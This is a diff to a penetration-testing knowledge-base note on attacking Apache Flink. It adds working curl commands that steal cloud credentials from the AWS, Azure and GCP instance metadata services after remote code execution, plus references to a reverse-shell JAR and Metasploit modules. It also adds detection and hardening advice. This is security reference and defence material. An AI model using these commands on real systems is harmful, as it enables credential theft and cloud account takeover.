@@ -23,6 +23,7 @@ Distributed stream and batch processing framework. Exposes a web dashboard and R
 | [[Tools/File Transfer/cURL\|cURL]] | All REST API interaction — enumeration, JAR upload, SQL Gateway submission |
 | [[Tools/Payloads & Shells/metasploit\|Metasploit]] | `apache_flink_jar_upload_exec` (RCE) and `apache_flink_jobmanager_traversal` (LFI) modules |
 | [[Tools/Payloads & Shells/msfvenom\|msfvenom]] | Generate the reverse-shell payload staged inside the malicious Flink JAR |
+| [[Tools/Cloud/aws-cli\|AWS CLI]] | Use the IAM role creds stolen from the cluster's IMDS after RCE (post-exploitation) |
 
 ---
 
@@ -228,6 +229,39 @@ cat /proc/$(pgrep -f StandaloneSessionClusterEntrypoint)/environ | tr '\0' '\n' 
   grep -i "key\|secret\|token\|pass\|aws\|azure"
 ```
 
+### RCE → Cloud Metadata (the real prize on a managed cluster)
+
+Flink is almost always deployed in a cloud VM or container with an attached instance role/managed identity. Once the JAR-upload or SQL-Gateway RCE gives you a shell as the flink user, the highest-value next step is the **instance metadata service** — the cluster's cloud credentials are usually far more powerful than anything in `flink-conf.yaml`. Same primitive as the [[Services/Cloud & Data/Databricks|Databricks]] notebook→IMDS pivot.
+
+```bash
+# --- AWS (IMDSv2 first — v1 401s on hardened instances) ---
+TOKEN=$(curl -sX PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+role=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role"   # → AccessKeyId/Secret/Token
+
+# --- Azure (managed identity) ---
+curl -s -H "Metadata: true" \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+
+# --- GCP (service account) ---
+curl -s -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+```
+
+Then take the stolen creds to [[Tools/Cloud/aws-cli|aws-cli]] / the cloud provider's API to enumerate and pivot into the wider account.
+
+---
+
+## Detection & Artefacts
+
+- **REST access logs.** Every JAR upload, `/run`, and SQL-Gateway statement is an HTTP request the JobManager logs. A `POST /jars/upload` followed by `/jars/<id>/run` from an external IP is the JAR-RCE signature; the `GET /jars/<id>/plan?entry-class=` variant is the quieter one to grep for.
+- **A rogue JAR persists in the uploaded-JARs list** (`GET /jars`) and on disk under the configured `web.upload.dir` — a fast hunt for an existing backdoor, and cleanup you should do after the engagement.
+- **IMDS credential use is visible cloud-side, not on the Flink host** — the cluster role suddenly calling `sts:GetCallerIdentity` / ARM is the tell. IMDSv2 + hop-limit `1` blunts the pivot.
+- **The real fix is auth + network isolation:** Flink has no built-in authentication, so exposure of 8081/8083 to anything but a trusted proxy is the root cause behind every vector here — flag that, not just the individual CVEs.
+
 ---
 
 ## Dangerous Settings
@@ -258,9 +292,13 @@ cat /proc/$(pgrep -f StandaloneSessionClusterEntrypoint)/environ | tr '\0' '\n' 
 | SQL Gateway info | `curl -s http://host:8083/v1/info` |
 | SQL Gateway session | `curl -X POST http://host:8083/v1/sessions -d '{}'` |
 | MSF RCE | `exploit/multi/http/apache_flink_jar_upload_exec` |
+| RCE→AWS creds (IMDSv2) | `TOKEN=$(curl -sX PUT .../latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); curl -H "X-aws-ec2-metadata-token: $TOKEN" .../iam/security-credentials/<role>` |
+| Hunt rogue JARs | `curl -s http://host:8081/jars` |
+
+> [!note] **See also** — sibling data-platform notes [[Services/Cloud & Data/Kafka|Kafka]] and [[Services/Cloud & Data/Databricks|Databricks]] share the RCE→cloud-metadata (IMDS) pivot. Cloud pivot tooling: [[Tools/Cloud/aws-cli|aws-cli]].
 
 ---
 
 *Created: 2026-07-28*
-*Updated: 2026-07-28*
+*Updated: 2026-09-22*
 *Model: claude-opus-4-8*
